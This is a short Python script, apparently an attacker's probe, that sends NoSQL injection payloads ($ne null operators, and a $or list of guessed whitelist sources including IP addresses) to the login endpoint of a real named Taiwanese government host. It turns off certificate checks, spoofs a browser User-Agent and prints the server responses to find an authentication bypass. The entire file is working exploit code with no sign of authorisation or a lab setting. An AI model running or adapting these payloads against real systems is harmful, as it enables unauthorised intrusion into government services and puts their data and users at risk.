import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"

print("=== 最终: NoSQL 注入 + 不同 Content-Type / 编码 ===")
tests=[
  ("query-string NoSQL", f"/login?username={{%22%24ne%22:null}}&password={{%22%24ne%22:null}}&captcha=1&domain=AUTH_SERVER", None),
  ("form NoSQL $ne", None, "username=%7B%22%24ne%22%3Anull%7D&password=%7B%22%24ne%22%3Anull%7D&captcha=1&domain=AUTH_SERVER"),
]
for name, url, form in tests:
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    try:
        s.get(BASE+"/captcha",timeout=10)
        if url:
            r=s.get(BASE+url, timeout=10)
        else:
            r=s.post(BASE+"/login", data=form, headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)
        print(f"  {name:28s} -> {r.status_code} {r.text[:60]}")
    except Exception as e:
        print(f"  {name} ERR {repr(e)[:35]}")
    time.sleep(0.1)

# 确认: 用 $ne 但 source 用 $or 多值 (覆盖可能的白名单)
print("\n=== source $or 多值爆破 (尝试命中白名单) ===")
whitelist=["localhost","epcr.tpf.gov.tw","118.163.107.93","35.234.50.28"]
body={"username":{"$ne":None},
      "source":{"$or":[{"source":w} for w in whitelist]},
      "password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
s.get(BASE+"/captcha",timeout=10)
r=s.post(BASE+"/login", json=body, timeout=10)
print(f"  source-$or(白名单4值) -> {r.status_code} {r.text[:70]}")
print("DONE")
